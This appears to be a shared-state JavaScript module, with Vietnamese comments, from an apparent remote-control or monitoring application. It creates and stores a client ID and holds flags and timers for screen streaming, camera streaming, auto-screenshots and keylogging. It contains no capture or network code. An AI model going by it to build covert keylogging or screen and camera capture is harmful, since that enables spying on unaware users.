// modules/store.js
// File nay chua cac bien "toan cuc" (state) cua ung dung
// de cac module khac co a chia se.

// Tao CLIENT_ID duy nhat
let CLIENT_ID = localStorage.getItem("rc_id");
if (!CLIENT_ID) {
  CLIENT_ID = "U_" + Math.floor(Math.random() * 9999);
  localStorage.setItem("rc_id", CLIENT_ID);
}

// 'store' la mot object dung chung
export const store = {
  db: null, // Doi tuong IndexedDB se duoc gan vao day
  CLIENT_ID: CLIENT_ID, // ID client

  // Bien de theo doi trang thai stream
  isScreenStreamOn: false,
  isCamStreamOn: false,

  // Bien luu bo dem thoi gian
  autoShotInt: null,
  keylogInt: null,
};
